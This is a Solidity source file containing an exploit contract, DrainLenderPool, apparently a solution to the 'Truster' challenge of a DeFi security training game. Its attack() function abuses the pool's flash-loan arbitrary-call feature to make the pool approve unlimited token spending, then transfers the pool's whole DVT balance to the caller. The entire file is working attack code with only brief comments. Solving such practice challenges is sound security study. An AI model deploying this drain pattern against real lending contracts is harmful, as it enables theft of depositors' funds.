//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title DrainLenderPool
 * @notice Drains DVT tokens from `TrusterLenderPool` contract
 * @author Joshua Oladeji <analogdev.eth>
 */
contract DrainLenderPool {
    IERC20 public immutable dvtToken;
    ITrusterLenderPool public immutable lendingPool;

    constructor(IERC20 _dvtToken, ITrusterLenderPool _lendingPool) {
        dvtToken = _dvtToken;
        lendingPool = _lendingPool;
    }

    function attack() external {
        // call flashloan here -> approve unlimited spending on behalf of Lending Pool
        lendingPool.flashLoan(
            0,
            address(this),
            address(dvtToken),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                type(uint256).max
            )
        );

        // transfer all funds of lenderPool to tx.origin
        dvtToken.transferFrom(
            address(lendingPool),
            tx.origin,
            dvtToken.balanceOf(address(lendingPool))
        );
    }
}

interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}
